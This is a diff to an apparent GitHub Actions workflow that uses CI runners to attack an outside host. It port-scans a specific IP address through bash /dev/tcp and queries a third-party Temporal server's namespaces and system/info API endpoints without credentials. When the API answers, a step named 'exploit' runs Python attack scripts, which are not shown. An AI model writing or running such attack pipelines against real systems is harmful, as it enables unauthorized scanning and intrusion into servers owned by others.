@@ -6,7 +6,7 @@ on:
 jobs:
   temporal:
     runs-on: ubuntu-latest
-    timeout-minutes: 20
+    timeout-minutes: 25
     steps:
       - uses: actions/checkout@v4
       - name: probe
@@ -18,13 +18,14 @@ jobs:
             if timeout 8 bash -c "echo > /dev/tcp/20.74.128.25/$p" 2>out/tcp_$p.err; then echo "$p OPEN" | tee -a out/dns.txt; else echo "$p CLOSED $(cat out/tcp_$p.err)" | tee -a out/dns.txt; fi
           done
           code=$(curl -skS --max-time 20 -o out/base_namespaces.body -w '%{http_code}' https://temporalio.dev.ayshei.io/api/v1/namespaces || true)
-          echo "probe=$code"
+          code2=$(curl -skS --max-time 20 -o out/base_sysinfo.body -w '%{http_code}' https://temporalio.dev.ayshei.io/api/v1/system/info || true)
+          echo "probe=$code sysinfo=$code2"
           echo "code=$code" >> $GITHUB_OUTPUT
           head -c 400 out/base_namespaces.body | tee out/base_namespaces.head
       - name: exploit
         if: steps.probe.outputs.code == '200'
         run: |
-          OUT=out python3 scripts/ul4035_exploit.py | tee out/run.log
+          OUT=out python3 scripts/ul4035_orchestrate.py 2>&1 | tee out/run.log
       - uses: actions/upload-artifact@v4
         if: always()
         with:
